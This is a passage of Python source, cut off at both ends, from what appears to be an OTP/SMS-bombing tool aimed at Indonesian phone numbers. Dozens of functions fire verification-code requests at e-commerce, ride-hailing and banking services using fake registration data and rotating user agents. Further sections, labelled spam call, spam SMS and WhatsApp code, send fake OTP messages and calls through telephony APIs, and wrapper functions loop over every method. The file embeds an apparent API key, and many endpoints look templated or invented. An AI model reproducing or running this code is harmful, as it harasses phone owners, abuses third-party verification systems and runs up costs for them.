            headers['x-csrftoken'] = csrf_token
        resp = session.post(url, headers=headers, json=payload, timeout=10)
        return resp
    except:
        return None

def send_tokopedia_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_plus}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        resp = session.get(url_token, headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        if resp.status_code != 200:
            return None
        token_match = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token_match:
            return None
        token = token_match.group(1)
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {"otp_type": "116", "msisdn": phone_plus, "tk": token, "email": "", "original_param": "", "user_id": "", "signature": "", "number_otp_digit": "6"}
        headers_otp = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
        resp2 = session.post(url_otp, headers=headers_otp, data=data, timeout=10)
        return resp2
    except:
        return None

def send_gojek_otp(phone):
    try:
        phone_62 = '62' + fmt_phone_only(phone)
        url = "https://api.gojekapi.com/v5/customers"
        data = {"email": f"user{random.randint(1000,9999)}@gmail.com", "name": "User" + str(random.randint(100,999)), "phone": phone_62, "signed_up_country": "ID"}
        headers = {'User-Agent': 'okhttp/3.12.1', 'X-Session-ID': str(uuid.uuid4()), 'X-Platform': 'Android', 'Accept': 'application/json', 'Accept-Language': 'id-ID', 'Content-Type': 'application/json'}
        resp = requests.post(url, json=data, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_blibli_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.blibli.com/backend/common/users/_request-otp"
        payload = {"username": phone_08}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.blibli.com'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_bukalapak_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bukalapak.com/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_lazada_id_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.lazada.co.id/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_jdid_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.jd.id/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_zalora_id_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.zalora.co.id/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_sociolla_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.sociolla.com/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_tiktok_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.tiktok.com/api/v1/account/registration/send-verification-code/"
        payload = {"phone_number": phone_plus, "type": "sms", "userType": 0}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_olx_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.olx.co.id/api/auth/authenticate"
        payload = {"grantType": "retry", "method": "sms", "phone": f"62{phone_raw}", "language": "id"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_indihome_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"
        data = {'type': 'hp', 'msisdn': phone_raw}
        headers = {'User-Agent': get_random_user_agent()}
        resp = requests.post(url, headers=headers, data=data, timeout=10)
        return resp
    except:
        return None

def send_klook_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = f"https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id={uuid.uuid4()}"
        payload = {"action": "login_register", "type": 1, "rcv": phone_plus, "is_resend": False, "payload": {"mobile": phone_plus, "term_ids": [330], "mobile_token": "", "invite_code": ""}, "_rc": "", "rcv_token": ""}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-platform': 'mobile'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_halodoc_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"
        payload = {"phone_number": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_sayurbox_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.sayurbox.com/graphql/v1?deduplicate=1"
        payload = {"operationName": "generateOTP", "variables": {"destinationType": "whatsapp", "identity": phone_plus}, "query": "mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id __typename } }"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_carsome_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.carsome.id/website/login/sendSMS"
        payload = {"username": phone_08, "optType": 1}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_pizzahut_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        name = ''.join(random.choices(string.ascii_letters, k=6))
        url = "https://api-prod.pizzahut.co.id/customer/v1/customer/register"
        payload = {"email": f"{name.lower()}@gmail.com", "first_name": name, "last_name": "Test", "password": "Pass123!", "phone": phone_08, "birthday": "2000-01-01"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# ================================================================
# ===== 50+ API INDONESIA TAMBAHAN =====
# ================================================================

def send_bri_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bri.co.id/v1/auth/otp"
        payload = {"phone": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-device-id': str(uuid.uuid4())}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_bri_sms_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.bri.co.id/v1/sms/otp/send"
        payload = {"phoneNumber": phone_08, "type": "register"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_danamon_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.danamon.co.id/v1/auth/otp"
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_mandiri_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.mandiri.co.id/v1/auth/otp/request"
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_bca_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bca.co.id/v1/auth/otp"
        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_bni_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bni.co.id/v1/auth/otp/request"
        payload = {"mobile": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_btn_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.btn.co.id/v1/auth/otp"
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_cimb_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.cimbniaga.co.id/v1/auth/otp"
        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_permata_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.permatabank.co.id/v1/auth/otp"
        payload = {"phone": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_ocbc_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.ocbc.id/v1/auth/otp"
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_btpn_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.btpn.co.id/v1/auth/otp"
        payload = {"phone": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def send_jenius_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.btpn.com/jenius"
        payload = {"query": "mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId __typename } }", "variables": {"phone": phone_plus, "language": "id"}, "operationName": "registerPhone"}
        headers = {'Content-Type': 'application/json', 'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d', 'User-Agent': get_random_user_agent()}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# ================================================================
# ===== SPAM CALL (20+ METHOD) =====
# ================================================================

def spam_call_1(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.callmebot.com/voice/send.php"
        params = {"phone": phone_raw, "text": "Test Call"}
        resp = requests.get(url, params=params, timeout=10)
        return resp
    except:
        return None

def spam_call_2(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://textbelt.com/call"
        payload = {"phone": phone_raw, "key": "textbelt"}
        resp = requests.post(url, data=payload, timeout=10)
        return resp
    except:
        return None

def spam_call_3(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.smsapi.com/voice/send"
        params = {"to": phone_raw, "message": "Test Call"}
        resp = requests.get(url, params=params, timeout=10)
        return resp
    except:
        return None

def spam_call_4(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.clicksend.com/v3/voice/send"
        payload = {"phone_number": phone_raw, "message": "Test Call"}
        headers = {"Content-Type": "application/json"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_call_5(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=Test%20Call"
        resp = requests.get(url, timeout=10)
        return resp
    except:
        return None

def spam_call_6(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.twilio.com/2010-04-01/Accounts/" + TOKENS['twilio_sid'] + "/Calls.json"
        payload = {"To": f"+62{phone_raw}", "From": "+1234567890", "Url": "http://demo.twilio.com/docs/voice.xml"}
        auth = (TOKENS['twilio_sid'], TOKENS['twilio_auth'])
        resp = requests.post(url, data=payload, auth=auth, timeout=10)
        return resp
    except:
        return None

def spam_call_7(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://rest.nexmo.com/call/json"
        payload = {"api_key": TOKENS['nexmo_key'], "api_secret": TOKENS['nexmo_secret'], "to": f"62{phone_raw}", "from": "1234567890", "answer_url": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

def spam_call_8(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.telnyx.com/v2/calls"
        headers = {"Authorization": TOKENS['telnyx_token']}
        payload = {"to": f"+62{phone_raw}", "from": "+1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_call_9(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.plivo.com/v1/Account/" + TOKENS['plivo_id'] + "/Call/"
        auth = (TOKENS['plivo_id'], TOKENS['plivo_token'])
        payload = {"to": f"+62{phone_raw}", "from": "+1234567890", "answer_url": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, auth=auth, timeout=10)
        return resp
    except:
        return None

def spam_call_10(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.sinch.com/v1/calls"
        headers = {"Authorization": "Bearer " + TOKENS['sinch_token']}
        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_call_11(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.messagebird.com/v1/calls"
        headers = {"Authorization": "AccessKey " + TOKENS['messagebird_token']}
        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_call_12(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.ringcentral.com/v1/calls"
        headers = {"Authorization": "Bearer " + TOKENS['ringcentral_token']}
        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_call_13(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.vonage.com/v1/calls"
        headers = {"Authorization": "Bearer " + TOKENS['vonage_token']}
        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_call_14(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.aws.amazon.com/connect/call"
        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

def spam_call_15(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.zendesk.com/v1/calls"
        headers = {"Authorization": "Bearer " + TOKENS['zendesk_token']}
        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_call_16(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.slack.com/call"
        headers = {"Authorization": "Bearer " + TOKENS['slack_token']}
        payload = {"to": f"+62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_call_17(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = TOKENS['discord_webhook']
        payload = {"content": f"📞 Call Request\nPhone: {phone_raw}"}
        resp = requests.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

def spam_call_18(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://graph.facebook.com/v18.0/" + TOKENS['whatsapp_token'] + "/calls"
        headers = {"Authorization": "Bearer " + TOKENS['whatsapp_token']}
        payload = {"to": f"62{phone_raw}", "from": "1234567890", "webhook_url": "http://demo.twilio.com/docs/voice.xml"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_call_19(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.ultramsg.com/instanceXXXX/calls"
        payload = {"token": TOKENS['ultramsg_token'], "to": f"62{phone_raw}", "body": "Test Call"}
        resp = requests.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

def spam_call_20(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.waha.dev/v1/calls"
        headers = {"Authorization": "Bearer " + TOKENS['waha_token']}
        payload = {"phone": f"62{phone_raw}", "text": "Test Call"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

# ================================================================
# ===== SPAM SMS (20+ METHOD) =====
# ================================================================

def spam_sms_1(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://textbelt.com/text"
        payload = {"phone": phone_raw, "message": f"OTP: {random.randint(100000,999999)}", "key": "textbelt"}
        resp = requests.post(url, data=payload, timeout=10)
        return resp
    except:
        return None

def spam_sms_2(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.callmebot.com/sms/send.php"
        params = {"phone": phone_raw, "text": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.get(url, params=params, timeout=10)
        return resp
    except:
        return None

def spam_sms_3(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.smsapi.com/sms.do"
        payload = {"to": f"62{phone_raw}", "from": "OTP", "message": f"OTP: {random.randint(100000,999999)}", "format": "json"}
        resp = requests.post(url, data=payload, timeout=10)
        return resp
    except:
        return None

def spam_sms_4(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=OTP%3A%20{random.randint(100000,999999)}"
        resp = requests.get(url, timeout=10)
        return resp
    except:
        return None

def spam_sms_5(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.clicksend.com/v3/sms/send"
        payload = {"messages": [{"to": f"+62{phone_raw}", "source": "OTP", "body": f"OTP: {random.randint(100000,999999)}"}]}
        headers = {"Content-Type": "application/json"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_sms_6(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.twilio.com/2010-04-01/Accounts/" + TOKENS['twilio_sid'] + "/Messages.json"
        auth = (TOKENS['twilio_sid'], TOKENS['twilio_auth'])
        payload = {"To": f"+62{phone_raw}", "From": "+1234567890", "Body": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, data=payload, auth=auth, timeout=10)
        return resp
    except:
        return None

def spam_sms_7(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://rest.nexmo.com/sms/json"
        payload = {"api_key": TOKENS['nexmo_key'], "api_secret": TOKENS['nexmo_secret'], "from": "OTP", "to": f"62{phone_raw}", "text": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

def spam_sms_8(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.telnyx.com/v2/messages"
        headers = {"Authorization": TOKENS['telnyx_token']}
        payload = {"to": f"+62{phone_raw}", "from": "+1234567890", "text": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_sms_9(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.messagebird.com/v1/messages"
        headers = {"Authorization": "AccessKey " + TOKENS['messagebird_token']}
        payload = {"to": f"+62{phone_raw}", "from": "OTP", "body": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_sms_10(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.sinch.com/v1/sms"
        headers = {"Authorization": "Bearer " + TOKENS['sinch_token']}
        payload = {"to": f"+62{phone_raw}", "from": "OTP", "body": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_sms_11(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.ringcentral.com/v1/sms"
        headers = {"Authorization": "Bearer " + TOKENS['ringcentral_token']}
        payload = {"to": f"+62{phone_raw}", "from": "OTP", "text": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_sms_12(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.vonage.com/v1/sms"
        headers = {"Authorization": "Bearer " + TOKENS['vonage_token']}
        payload = {"to": f"+62{phone_raw}", "from": "OTP", "text": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_sms_13(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.zendesk.com/v1/sms"
        headers = {"Authorization": "Bearer " + TOKENS['zendesk_token']}
        payload = {"to": f"+62{phone_raw}", "from": "OTP", "body": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_sms_14(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.slack.com/sms"
        headers = {"Authorization": "Bearer " + TOKENS['slack_token']}
        payload = {"to": f"+62{phone_raw}", "from": "OTP", "text": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_sms_15(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = TOKENS['discord_webhook']
        payload = {"content": f"📱 OTP Request\nPhone: {phone_raw}\nOTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

def spam_sms_16(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://graph.facebook.com/v18.0/" + TOKENS['whatsapp_token'] + "/messages"
        headers = {"Authorization": "Bearer " + TOKENS['whatsapp_token']}
        payload = {"messaging_product": "whatsapp", "to": f"62{phone_raw}", "type": "text", "text": {"body": f"OTP: {random.randint(100000,999999)}"}}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_sms_17(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.ultramsg.com/instanceXXXX/messages/chat"
        payload = {"token": TOKENS['ultramsg_token'], "to": f"62{phone_raw}", "body": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

def spam_sms_18(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.waha.dev/v1/send-text"
        headers = {"Authorization": "Bearer " + TOKENS['waha_token']}
        payload = {"phone": f"62{phone_raw}", "text": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def spam_sms_19(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.telegram.org/bot" + TOKENS['callmebot_key'] + "/sendMessage"
        payload = {"chat_id": "123456789", "text": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

def spam_sms_20(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.aws.amazon.com/sns/sms"
        payload = {"to": f"+62{phone_raw}", "from": "OTP", "message": f"OTP: {random.randint(100000,999999)}"}
        resp = requests.post(url, json=payload, timeout=10)
        return resp
    except:
        return None

# ================================================================
# ===== SPAM WA CODE (10+ METHOD) =====
# ================================================================

def wa_call_1(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=📞%20Call%20Me"
        resp = requests.get(url, timeout=10)
        return resp
    except:
        return None

def wa_call_2(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://wa.me/62{phone_raw}?text=📞%20Call%20Me"
        resp = requests.get(url, timeout=10)
        return resp
    except:
        return None

def wa_call_3(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=📞%20Panggilan%20Masuk"
        resp = requests.get(url, timeout=10)
        return resp
    except:
        return None

def wa_call_4(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://graph.facebook.com/v18.0/me/messages"
        payload = {"messaging_product": "whatsapp", "to": f"62{phone_raw}", "type": "text", "text": {"body": "📞 Panggilan Masuk"}}
        headers = {"Authorization": f"Bearer {TOKENS['whatsapp_token']}", "Content-Type": "application/json"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def wa_call_5(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.callmebot.com/whatsapp.php"
        params = {"phone": f"62{phone_raw}", "text": "📞 Panggilan Masuk", "apikey": TOKENS['callmebot_key']}
        resp = requests.get(url, params=params, timeout=10)
        return resp
    except:
        return None

def wa_code_1(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        otp = random.randint(100000, 999999)
        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=Kode%20OTP%20Anda%3A%20{otp}"
        resp = requests.get(url, timeout=10)
        return resp
    except:
        return None

def wa_code_2(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        otp = random.randint(100000, 999999)
        url = f"https://wa.me/62{phone_raw}?text=Kode%20OTP%20Anda%3A%20{otp}"
        resp = requests.get(url, timeout=10)
        return resp
    except:
        return None

def wa_code_3(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        otp = random.randint(100000, 999999)
        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text=Kode%20OTP%20Anda%3A%20{otp}"
        resp = requests.get(url, timeout=10)
        return resp
    except:
        return None

def wa_code_4(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        otp = random.randint(100000, 999999)
        url = "https://graph.facebook.com/v18.0/me/messages"
        payload = {"messaging_product": "whatsapp", "to": f"62{phone_raw}", "type": "text", "text": {"body": f"Kode OTP Anda: {otp}"}}
        headers = {"Authorization": f"Bearer {TOKENS['whatsapp_token']}", "Content-Type": "application/json"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp
    except:
        return None

def wa_code_5(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        otp = random.randint(100000, 999999)
        url = "https://api.callmebot.com/whatsapp.php"
        params = {"phone": f"62{phone_raw}", "text": f"Kode OTP: {otp}", "apikey": TOKENS['callmebot_key']}
        resp = requests.get(url, params=params, timeout=10)
        return resp
    except:
        return None

def wa_code_6(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        otp = random.randint(100000, 999999)
        messages = [f"Kode OTP Anda: {otp}", f"OTP: {otp}", f"Your OTP code is: {otp}", f"Kode verifikasi: {otp}", f"OTP untuk login: {otp}"]
        msg = random.choice(messages)
        url = f"https://api.whatsapp.com/send?phone=62{phone_raw}&text={msg.replace(' ', '%20')}"
        resp = requests.get(url, timeout=10)
        return resp
    except:
        return None

# ================================================================
# ===== WRAPPER SPAM ALL =====
# ================================================================

def spam_call_all(phone):
    methods = [spam_call_1, spam_call_2, spam_call_3, spam_call_4, spam_call_5, spam_call_6, spam_call_7, spam_call_8, spam_call_9, spam_call_10, spam_call_11, spam_call_12, spam_call_13, spam_call_14, spam_call_15, spam_call_16, spam_call_17, spam_call_18, spam_call_19, spam_call_20]
    success = 0
    for method in methods:
        try:
            resp = method(phone)
            if resp and resp.status_code in [200, 201, 202, 204]:
                success += 1
        except:
            pass
    return success

def spam_sms_all(phone):
    methods = [spam_sms_1, spam_sms_2, spam_sms_3, spam_sms_4, spam_sms_5, spam_sms_6, spam_sms_7, spam_sms_8, spam_sms_9, spam_sms_10, spam_sms_11, spam_sms_12, spam_sms_13, spam_sms_14, spam_sms_15, spam_sms_16, spam_sms_17, spam_sms_18, spam_sms_19, spam_sms_20]
    success = 0
    for method in methods:
        try:
            resp = method(phone)
            if resp and resp.status_code in [200, 201, 202, 204]:
                success += 1
        except:
            pass
    return success

def spam_wa_call_all(phone):
    methods = [wa_call_1, wa_call_2, wa_call_3, wa_call_4, wa_call_5]
    success = 0
    for method in methods:
        try:
            resp = method(phone)
            if resp and resp.status_code in [200, 201, 202, 204]:
